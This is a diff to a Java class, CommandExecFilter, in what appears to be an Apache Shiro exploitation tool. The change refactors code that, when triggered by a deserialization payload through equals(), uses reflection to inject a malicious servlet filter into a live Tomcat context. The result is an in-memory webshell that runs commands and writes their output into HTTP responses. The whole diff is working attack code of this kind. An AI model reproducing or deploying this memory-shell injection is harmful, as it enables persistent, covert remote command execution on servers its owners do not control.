@@ -3,7 +3,6 @@ package com.sma11new.exp.shiro.attack.shell;
 import org.apache.catalina.LifecycleState;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.loader.WebappClassLoaderBase;
 import org.apache.catalina.util.LifecycleBase;
 import org.apache.shiro.codec.Base64;
 
@@ -13,8 +12,6 @@ import javax.servlet.http.HttpServletResponse;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.nio.charset.Charset;
-import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.EnumSet;
 import java.util.Optional;
@@ -26,6 +23,14 @@ public class CommandExecFilter implements Filter {
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
     boolean isWindows;
+
+    public CommandExecFilter() {
+        // only spring
+        /*org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
+        request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
+        response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
+        core();*/
+    }
 
     @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
@@ -81,14 +86,8 @@ public class CommandExecFilter implements Filter {
         return list;
     }
 
-    @Override
-    public boolean equals(Object obj) {
+    private void addFilter() {
         try {
-            parseObj(obj);
-            // WebappClassLoaderBase classLoader = (WebappClassLoaderBase) obj;
-            // StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
-            // ServletContext servletContext = standardContext.getServletContext();
-
             ServletContext servletContext = this.request.getServletContext();
             Field contextField = null;
             ApplicationContext applicationContext = null;
@@ -99,10 +98,10 @@ public class CommandExecFilter implements Filter {
             try {
                 contextField = servletContext.getClass().getDeclaredField("context");
                 contextField.setAccessible(true);
-                applicationContext = (ApplicationContext)contextField.get(servletContext);
+                applicationContext = (ApplicationContext) contextField.get(servletContext);
                 contextField = applicationContext.getClass().getDeclaredField("context");
                 contextField.setAccessible(true);
-                standardContext = (StandardContext)contextField.get(applicationContext);
+                standardContext = (StandardContext) contextField.get(applicationContext);
 
                 stateField.set(standardContext, LifecycleState.STARTING_PREP);
 
@@ -139,13 +138,14 @@ public class CommandExecFilter implements Filter {
                 this.response.getWriter().print(output.toString());
                 this.response.getWriter().flush();
                 this.response.getWriter().close();
-            } catch (Exception var6) {
-            }
+            } catch (Exception var6) {}
+        } catch (Exception var5) {}
+    }
 
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    @Override
+    public boolean equals(Object obj) {
+        parseObj(obj);
+        addFilter();
         return false;
     }
 
